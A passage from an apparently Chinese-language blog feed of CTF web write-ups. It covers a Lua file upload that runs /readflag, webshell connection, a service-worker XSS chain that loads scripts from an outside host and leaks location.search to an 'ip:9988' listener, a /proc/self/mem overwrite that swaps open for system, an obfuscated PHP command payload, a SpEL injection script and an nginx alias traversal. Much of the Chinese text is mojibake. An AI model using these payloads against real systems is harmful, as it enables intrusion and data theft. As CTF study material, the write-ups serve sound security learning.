http:&#x2F;&#x2F;newupload.xhlj.wetolink.com&#x2F;sandbox&#x2F;gkqh0jd0dmt742l6r5k85qnp20&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;gkqh0jd0dmt742l6r5k85qnp20</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryY23uQf1rBX9q3Ctt</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;2.lua&quot;</span><br><span class="line">Content-Type: image&#x2F;png</span><br><span class="line"></span><br><span class="line">require &quot;string&quot;</span><br><span class="line"></span><br><span class="line">--[[</span><br><span class="line">     This is the default method name for Lua handlers, see the optional</span><br><span class="line">     function-name in the LuaMapHandler directive to choose a different</span><br><span class="line">     entry point.</span><br><span class="line">--]]</span><br><span class="line">function handle(r)</span><br><span class="line">    r.content_type &#x3D; &quot;text&#x2F;plain&quot;</span><br><span class="line">    r:puts(&quot;Hello Lua World!\n&quot;)</span><br><span class="line">    local t &#x3D; io.popen(&#39;&#x2F;readflag&#39;)</span><br><span class="line">    local a &#x3D; t:read(&quot;*all&quot;)</span><br><span class="line">    r:puts(a)</span><br><span class="line">    if r.method &#x3D;&#x3D; &#39;GET&#39; then</span><br><span class="line">        for k, v in pairs( r:parseargs() ) do</span><br><span class="line">            r:puts( string.format(&quot;%s: %s\n&quot;, k, v) )</span><br><span class="line">        end</span><br><span class="line">    else</span><br><span class="line">        r:puts(&quot;Unsupported HTTP method &quot; .. r.method)</span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line">------WebKitFormBoundaryY23uQf1rBX9q3Ctt--</span><br></pre></td></tr></table></figure>

<p>3</p>
<p><img src="/2020/10/12/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web-wp/image-20201016082132421.png" alt="image-20201016082132421"></p>
<p>æ–¹æ³•äºŒï¼šèšå‰‘</p>
<p>æ¢è¡Œç»•è¿‡ä¸Šä¼ php</p>
<p><img src="/2020/10/12/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web-wp/image-20201016082732515.png" alt="image-20201016082732515"></p>
<p><a href="https://github.com/AntSwordProject/AwesomeEncoder/tree/master/php/encoder" target="_blank" rel="noopener">åˆ©ç”¨ç¼–ç å™¨</a>è¿æ¥èšå‰‘ï¼Œ</p>
<p><img src="/2020/10/12/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web-wp/image-20201016082617534.png" alt="image-20201016082617534"></p>
<p>åˆ©ç”¨èšå‰‘æ’ä»¶é€šè¿‡fpmç»•è¿‡disabled_functionï¼Œæµ‹è¯•æ²¡æœ‰æˆåŠŸ</p>
<h1 id="0x02-hardxss"><a href="#0x02-hardxss" class="headerlink" title="0x02 hardxss"></a>0x02 hardxss</h1><p>åœ¨ç™»å½•å¤„å³é”®æºä»£ç å¯ä»¥çœ‹è§å¦‚ä¸‹çš„ä»£ç </p>
<p><img src="/2020/10/12/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web-wp/image-20201021093130506.png" alt="image-20201021093130506"></p>
<p><code>auto_reg_vat()</code>ä¼šæŠŠgetä¼ çš„å‚æ•°å­˜å‚¨åˆ°keyå’Œvalueä¸­ï¼Œç„¶åèµ‹ç»™windowå…¨å±€å˜é‡ï¼Œè¿™é‡Œå­˜åœ¨å˜é‡è¦†ç›–ï¼Œå¯ä»¥é€šè¿‡getä¼ å…¥callbackæ¥xssã€‚</p>
<p>è¿™é“é¢˜åˆ©ç”¨service workerï¼Œservice workerä¸ªäººè®¤ä¸ºå¯ä»¥ç†è§£ä¸ºä»£ç†ï¼Œåº”è¯¥æ˜¯ç”¨æ¥ç¦»çº¿ç¼“å­˜èµ„æºï¼Œå¦å¤–å…³é”®çš„ä¸€ç‚¹å°±æ˜¯service workerå¿…é¡»åœ¨httpså’Œlocalhostä¸Šæ‰èƒ½è¿è¡Œã€‚</p>
<p><img src="/2020/10/12/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web-wp/image-20201021094327839.png" alt="image-20201021094327839"></p>
<p>222.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.domain = <span class="string">"hardxss.xhlj.wetolink.com"</span>;</span><br><span class="line"><span class="keyword">var</span> iff = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">iff.src = <span class="string">'https://auth.hardxss.xhlj.wetolink.com/'</span>;</span><br><span class="line">iff.addEventListener(<span class="string">"load"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; iffLoadover(); &#125;);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(iff);</span><br><span class="line">exp = <span class="string">`navigator.serviceWorker.register("/api/loginStatus?callback=self.importScripts('//www.mount4in.tk/a/sw.js');//")`</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iffLoadover</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    iff.contentWindow.eval(exp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sw.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">self.addEventListener(<span class="string">'install'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'install ok!'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">self.addEventListener(<span class="string">'fetch'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(event.request);</span><br><span class="line">    event.respondWith(</span><br><span class="line">    caches.match(event.request).then(<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> requestBackend(event);</span><br><span class="line">    &#125;)</span><br><span class="line">    )</span><br><span class="line">&#125;);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">requestBackend</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> url = event.request.clone();</span><br><span class="line">    <span class="built_in">console</span>.log(url);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Response(<span class="string">"&lt;script&gt;alert(location.search);&lt;/script&gt;"</span>, &#123;<span class="attr">headers</span>: &#123; <span class="string">'Content-Type'</span>: <span class="string">'text/html'</span> &#125;&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/12/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web-wp/image-20201021151947512.png" alt="image-20201021151947512"></p>
<p><img src="/2020/10/12/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web-wp/image-20201021152005317.png" alt="image-20201021152005317"></p>
<p>ç™»å½•åŠ«æŒ</p>
<p><img src="/2020/10/12/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web-wp/image-20201021152827670.png" alt="image-20201021152827670"></p>
<p>å¦å¤–è¿˜å¯ä»¥åˆ©ç”¨<a href="https://repl.itå¼€å¯ä¸€ä¸ªphp" target="_blank" rel="noopener">https://repl.itå¼€å¯ä¸€ä¸ªphp</a> web serveræ¥è§£å†³</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//666.js</span></span><br><span class="line"><span class="built_in">document</span>.domain = <span class="string">"hardxss.xhlj.wetolink.com"</span>;</span><br><span class="line"><span class="keyword">var</span> iff = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">iff.src = <span class="string">'https://auth.hardxss.xhlj.wetolink.com/'</span>;</span><br><span class="line">iff.addEventListener(<span class="string">"load"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; iffLoadover(); &#125;);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(iff);</span><br><span class="line">exp = <span class="string">`navigator.serviceWorker.register("/api/loginStatus?callback=importScripts('//aa.mount4in.repl.co/sw6.js');//")`</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iffLoadover</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    iff.contentWindow.eval(exp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//sw6.js</span></span><br><span class="line"><span class="keyword">this</span>.addEventListener(<span class="string">'install'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'service worker install!'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">this</span>.addEventListener(<span class="string">'fetch'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> url = event.request.clone();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'url: '</span>, url);</span><br><span class="line">    <span class="keyword">var</span> body = <span class="string">'&lt;script&gt;window.open("http://ip:9988?test="+location.search)&lt;/script&gt;'</span>;</span><br><span class="line">    <span class="keyword">var</span> init = &#123;<span class="attr">headers</span>: &#123;<span class="string">"Content-Type"</span>: <span class="string">"text/html"</span>&#125;&#125;;</span><br><span class="line">    <span class="keyword">var</span> res = <span class="keyword">new</span> Response(body, init);</span><br><span class="line">    event.respondWith(res.clone());</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/12/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web-wp/image-20201022172601545.png" alt="image-20201022172601545"></p>
<h1 id="0x03-flagshop"><a href="#0x03-flagshop" class="headerlink" title="0x03 flagshop"></a>0x03 flagshop</h1><p><a href="http://flagshop.xhlj.wetolink.com/" target="_blank" rel="noopener">http://flagshop.xhlj.wetolink.com/</a></p>
<p>æœ‰ä»»æ„æ–‡ä»¶è¯»å†™æ¼æ´</p>
<p>backend.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$offset = <span class="keyword">isset</span>($_GET[<span class="string">'offset'</span>]) ? $_GET[<span class="string">'offset'</span>] : <span class="number">0</span>;</span><br><span class="line">$buffer = <span class="keyword">isset</span>($_GET[<span class="string">'buffer'</span>]) ? $_GET[<span class="string">'buffer'</span>] : <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'writefile'</span>])) &#123;</span><br><span class="line">    $fp = fopen($_GET[<span class="string">'writefile'</span>], <span class="string">"a"</span>);</span><br><span class="line">    fseek($fp, $offset);</span><br><span class="line">    fwrite($fp, $buffer);</span><br><span class="line">    fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'readfile'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($_GET[<span class="string">'readfile'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆäº†è§£ä¸‹é¢å‡ ä¸ªæ–‡ä»¶</p>
<blockquote>
<h3 id="proc-pid-maps"><a href="#proc-pid-maps" class="headerlink" title="/proc/pid/maps"></a>/proc/pid/maps</h3><p>åŒ…å«äº†å½“å‰è¿›ç¨‹æ˜ å°„çš„å†…å­˜åŒºåŸŸä»¥åŠä»–ä»¬çš„è®¿é—®æƒé™.æ–‡ä»¶æ ¼å¼å¦‚ä¸‹:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">address           perms offset  dev   inode   pathname</span><br><span class="line">08048000-08056000 r-xp 00000000 03:0c 64593   &#x2F;usr&#x2F;sbin&#x2F;gpm</span><br><span class="line">08056000-08058000 rw-p 0000d000 03:0c 64593   &#x2F;usr&#x2F;sbin&#x2F;gpm</span><br><span class="line">08058000-0805b000 rwxp 00000000 00:00 0</span><br><span class="line">40000000-40013000 r-xp 00000000 03:0c 4165    &#x2F;lib&#x2F;ld-2.2.4.so</span><br><span class="line">40013000-40015000 rw-p 00012000 03:0c 4165    &#x2F;lib&#x2F;ld-2.2.4.so</span><br><span class="line">4001f000-40135000 r-xp 00000000 03:0c 45494   &#x2F;lib&#x2F;libc-2.2.4.so</span><br><span class="line">40135000-4013e000 rw-p 00115000 03:0c 45494   &#x2F;lib&#x2F;libc-2.2.4.so</span><br><span class="line">4013e000-40142000 rw-p 00000000 00:00 0</span><br><span class="line">bffff000-c0000000 rwxp 00000000 00:00 0</span><br></pre></td></tr></table></figure>

<ul>
<li>address,è¡¨ç¤ºè¿›ç¨‹å ç”¨çš„åœ°å€.</li>
<li>perms, è¡¨ç¤ºä¸€ç³»åˆ—æƒé™.r=read,w=write,x=execute,s=shared,p=private(copy on write)</li>
<li>offset, è¡¨ç¤ºæ–‡ä»¶åç§»é‡</li>
<li>dev:è¡¨ç¤ºè®¾å¤‡ (ä¸»è¦è®¾å¤‡,æ¬¡è¦è®¾å¤‡)</li>
<li>inode: è¡¨ç¤ºè®¾å¤‡ä¸Šé¢çš„inodeç¼–å·.å¦‚æœæ˜¯0,è¡¨ç¤ºæ²¡æœ‰ç´¢å¼•èŠ‚ç‚¹ä¸å†…å­˜åŒºåŸŸå…³è”,å°±å¦‚åŒBSSæ®µä¸€æ ·.</li>
<li>pathname,åœ¨Linux2.0ä¹‹å‰,æ²¡æœ‰pathnameå­—æ®µ.</li>
</ul>
<h3 id="proc-self-exe"><a href="#proc-self-exe" class="headerlink" title="/proc/self/exe"></a>/proc/self/exe</h3><p>åœ¨Linux2.2çš„å†…æ ¸åŠå…¶ä¹‹å,/proc/pid/exeæ˜¯ç›´æ¥æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶çš„ç¬¦å·é“¾æ¥.è¿™ä¸ªç¬¦å·é“¾æ¥èƒ½å¤Ÿè¢«å–æ¶ˆ.å°è¯•æ‰“å¼€è¿™ä¸ªæ–‡ä»¶å°±ç›¸å½“ä¸æ‰“å¼€äº†äºŒè¿›åˆ¶æ–‡ä»¶,ç”šè‡³å¯ä»¥é€šè¿‡é‡æ–°è¾“å…¥/proc/pid/exeé‡æ–°è¿è¡Œä¸€ä¸ªå¯¹åº”äºpidçš„äºŒè¿›åˆ¶æ–‡ä»¶.åœ¨ä¸€ä¸ªå¤šçº¿ç¨‹çš„ç¨‹åºä¸­,å¦‚æœä¸»çº¿ç¨‹å·²ç»é€€å‡ºäº†,å°±æ— æ³•è®¿é—®è¿™ä¸ªç¬¦å·é“¾æ¥.</p>
<p>åœ¨Linux2.0åŠå…¶ä¹‹å‰,/proc/pid/exeæ˜¯æŒ‡å‘å½“å‰è¿›ç¨‹æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶</p>
<h3 id="proc-self-mem"><a href="#proc-self-mem" class="headerlink" title="/proc/self/mem"></a>/proc/self/mem</h3><p>/proc/self/memæ˜¯è¿›ç¨‹çš„å†…å­˜å†…å®¹ï¼Œé€šè¿‡ä¿®æ”¹è¯¥æ–‡ä»¶ç›¸å½“äºç›´æ¥ä¿®æ”¹å½“å‰è¿›ç¨‹çš„å†…å­˜ã€‚è¯¥æ–‡ä»¶ä¸èƒ½ç›´æ¥è¯»å–ï¼Œéœ€è¦ç»“åˆmapsçš„æ˜ å°„ä¿¡æ¯æ¥ç¡®å®šè¯»çš„åç§»å€¼ã€‚å³æ— æ³•è¯»å–æœªè¢«æ˜ å°„çš„åŒºåŸŸï¼Œåªæœ‰è¯»å–çš„åç§»å€¼æ˜¯è¢«æ˜ å°„çš„åŒºåŸŸæ‰èƒ½æ­£ç¡®è¯»å–å†…å­˜å†…å®¹ã€‚</p>
</blockquote>
<p>é€šè¿‡ä»»æ„æ–‡ä»¶è¯»å–ï¼Œè¯»åˆ°å½“å‰è¿›ç¨‹ä½¿ç”¨çš„glibcä½ç½®å’Œåœ°å€ï¼Œç„¶åé€šè¿‡ä¿®æ”¹å†…å­˜å°†file_get_contentså‡½æ•°å®é™…è°ƒç”¨çš„openå‡½æ•°çš„åœ°å€ï¼Œä¿®æ”¹ä¸ºsystemå‡½æ•°çš„åœ°å€ã€‚ä¹‹åå†è°ƒç”¨file_get_contentsæ—¶å³è°ƒç”¨systemå‡½æ•°æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p>è¯»libcçš„åœ°å€</p>
<p><img src="/2020/10/12/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web-wp/image-20201023195206100.png" alt="image-20201023195206100"></p>
<p>å¯»æ‰¾systemå’Œopençš„åç§»ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">readelf  -s libc-2.19.so  | egrep "\s(system|open)@@"</span><br><span class="line">//egrepä¸ºå¸¦æ­£åˆ™çš„åŒ¹é…ç›¸å½“äº grep -e</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/12/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web-wp/image-20201023194250256.png" alt="image-20201023194250256"></p>
<blockquote>
<p>è¿™é‡Œæœ‰ä¸ªæ³¨æ„ç‚¹ï¼Œåœ¨ç”¨burpä¿å­˜äºŒè¿›åˆ¶æ–‡ä»¶æ—¶ï¼Œåœ¨æ–‡ä»¶å¤´æœ‰ä¸€ä¸ª%7Fï¼Œå¦‚æœæ²¡å¤åˆ¶è¿‡æ¥çš„è¯ï¼ŒELFæ–‡ä»¶å°±ä¸å®Œæ•´ã€‚</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> dechex(<span class="number">0x7ffff5f40000</span>+<span class="number">0x0000000000046590</span>);</span><br><span class="line"><span class="comment">//systemå‡½æ•°ç»“æœï¼š0x7ffff5f86590*</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x04-easyjson"><a href="#0x04-easyjson" class="headerlink" title="0x04 easyjson"></a>0x04 easyjson</h1><p><a href="http://easyjson.xhlj.wetolink.com/" target="_blank" rel="noopener">http://easyjson.xhlj.wetolink.com/</a> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;?source&#x3D;1&amp;action&#x3D;write&amp;filename&#x3D;a.php HTTP&#x2F;1.1</span><br><span class="line">Host: easyjson.xhlj.wetolink.com</span><br><span class="line">Content-Length: 111</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;easyjson.xhlj.wetolink.com</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.75 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;easyjson.xhlj.wetolink.com&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">X-Forwarded-For: 23.23.23.23.</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;\u0063\u006f\u006e\u0074\u0065\u006e\u0074&quot;:&quot;&lt;?&#x3D;&#96;\u002f\u0072\u0065\u0061\u0064\u0066\u006c\u0061\u0067&#96;;?&gt;&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/12/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web-wp/image-20201021204338713.png" alt="image-20201021204338713"></p>
<h1 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h1><p>å‚è€ƒé“¾æ¥</p>
<p><a href="https://lightless.me/archives/XSS-With-Service-Worker.html" target="_blank" rel="noopener">https://lightless.me/archives/XSS-With-Service-Worker.html</a></p>
<p><a href="https://www.bertramc.cn/2020/10/09/66.html" target="_blank" rel="noopener">https://www.bertramc.cn/2020/10/09/66.html</a></p>
<p><a href="https://blog.spoock.com/2019/10/08/proc/" target="_blank" rel="noopener">https://blog.spoock.com/2019/10/08/proc/</a></p>
<p><a href="https://mp.weixin.qq.com/s/wOnv-dUMtt1tfp306Fe8oA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/wOnv-dUMtt1tfp306Fe8oA</a></p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>è‹¥ä¾åå°ç®¡ç†ç³»ç»Ÿshiroååºåˆ—åŒ–æ¼æ´</title>
    <url>/2020/09/18/%E8%8B%A5%E4%BE%9D%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fshiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">è¾“å…¥å¯†ç ï¼ŒæŸ¥çœ‹æ–‡ç« ã€‚</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="5502dfd896daa08e455e0f06ac9d891f9e73c247d3ed621a0325aa866971f4d6">79f895b046debf0182686564293f0bc9766f3882732258faf25e35465b0a54cbcdc22a13e876f920d86b05d2764e07f74afcd53e239518f15050d0087379d72e7a543f875e8b23536617cca65fb96b4cbf4b1a0807620f6de09a097876fca6d45c694c2293b473a3affccb3c4d6f5717a411c823dfa1b43f3cd9fe53c2e176c92c6ccf10c416995bc9707011951f15fa56d61721f36f0810fa8eaccafd7f99e26888e5269c5548b3501fc46e0e2d187fecc7f81142f0b36079887ed55976cd3b66856ac9be78bb9292138b673a275eecd0941e7ac704b9f8aee5dca460fff41713a94567c39163ec078060953908e3ceab66e80772f753b5991ee06ee5bdfe4f07f486b38722502ac48d1b628d5b998edc7fdcce4e9f21d1a5dbf0f34b8ffef9b6f601ee92e6ccdfdab2100b19f8f00beacd7c4c720033bfac4108062387d9c49f2e2eb92b15d227edcc5fa5195c8b2a7a0c24daeb1f172d1ff553b0e8596d34fe58dbb50ec1750a5524ecb67c0111b33405ef2264001b870bad9cbb950840aace2b44bad167421c429563a29472503f9b9f84be6cc526fa7adf2732d02b159dce0c0506f0881bd9ae35c1fa7fb74e2e9764b6785487fa605835ba3c4d2a3aca96cb12a6a6283b043c2f8d7be08345d23d5090c3cd8f16d41b8f37766aac1dd9bc8b2339267d05b2399f8af780a2536036ae9ca3f28c5aa5ad69cc81da531aec2d220a53ceab3e968dc38236d6cb6667197a775ac75a48722c5677d3ee16842ddacaea19f85d1a332539e7553ff6a29bb24a2b0e63c9371844f0b764951b12b633781d7ef8acfc314669a9efe1844d115affa3dcff67a1ec08998794c910ef333ff6c93bbc5663b71cd79236c2dcc21f3133c1f7cb46032c84c8f1e2e5e047e5c7224494b66c346a6bb7be0d3d669e761cc98ad0d092631527d607d0288714b0dbc820048fb97a5e65935f2c1413f47d402dd3614a40bc4e70d73ab534bf9534e644588158cdc1f303290d4fac4e3520a0a00804778f69fe4b7620dfad66cb819c49effa39fbf53b371cab83d28348d6026e73e8b8ea427d82255b417d7a44ca7a6b411f586eb5875e92978ea0a28e4c010efbaaeaf244d0ff94932f1158bc09200d674f184e02c987703e21208dcf062df144eba5edc625aec6ae6bc986481e46bf25d08ebd3979d2c8062cf627e938e173f5848d2d0876e9af9866dad4b596310fb087f5df99218dc779d14630bbdddd8b7bc2cd1176fa06cbc1d379eaae49251b1a2e3be8aba39aed702fcd86036d4193a9b8dc9847ffe6c56844dc436807121c44629569ecad85e51b06f7c6b7b0</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>2020ciscnåä¸œåŒ—åˆ†åŒºèµ›webé¢˜ç›®wp</title>
    <url>/2020/09/13/2020ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9Bweb%E9%A2%98%E7%9B%AEwp/</url>
    <content><![CDATA[<p>å‰è¨€ï¼š2333</p>
<a id="more"></a>

<h1 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h1><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>ç›´æ¥è®¿é—®flag.phpå°±å¯ä»¥äº†ã€‚</p>
<p>æ„Ÿè§‰é¢„æœŸè§£åº”è¯¥ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;huadongbei&#x2F;cat.php?s1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,Zmlyc3QgYmxvb2Q&#x3D;&amp;s2&#x3D;0e215962017&amp;s3&#x3D;SHELL.TXT HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.43.44</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.102 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 13</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">file&#x3D;flag.php</span><br></pre></td></tr></table></figure>

<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>spelè¡¨è¾¾å¼æ³¨å…¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.class. forName(&quot;java.nio.file.File&quot;).lines(1.class. forName(&quot;java.nio.file.Paths&quot;).get(&quot;&#x2F;flag.txt&quot;)).toArray()[0]</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/13/2020ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9Bweb%E9%A2%98%E7%9B%AEwp/image-20200912171629921.png" alt="image-20200912171629921"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://172.20.7.104:8080"</span></span><br><span class="line">payload = <span class="string">"1.class.forName(\"java.nio.file.Files\").lines\x00(1.class.forName(\"java.nio.file.Paths\").get\x00(\"/flag.txt\")).toArray()[0]"</span></span><br><span class="line">proxy = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line">data = &#123;<span class="string">"expr"</span>:payload&#125; </span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">&#125;</span><br><span class="line">re = requests.post(url, data, headers=headers, proxies=proxy)</span><br><span class="line">print(re.content)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/13/2020ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9Bweb%E9%A2%98%E7%9B%AEwp/image-20200912171031671.png" alt="image-20200912171031671"></p>
<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>å‚è€ƒï¼š</p>
<p><a href="http://blackwolfsec.cc/2018/05/23/Nginx_alias_misconfig_path_traversle/" target="_blank" rel="noopener">Nginxé”™è¯¯é…ç½®aliaså¯¼è‡´ç›®å½•éå†æ¼æ´</a></p>
<p><img src="/2020/09/13/2020ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9Bweb%E9%A2%98%E7%9B%AEwp/image-20200912203459538.png" alt="image-20200912203459538"></p>
<p>nginxé…ç½®å‡ºé”™ï¼Œå¯ä»¥è¯»æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;default.conf</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name _;</span><br><span class="line">    location &#x2F;static &#123;</span><br><span class="line">        autoindex on;</span><br><span class="line">        alias &#x2F;app&#x2F;static&#x2F;;</span><br><span class="line">    &#125;</span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">	    proxy_pass http:&#x2F;&#x2F;127.0.0.1:3000;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



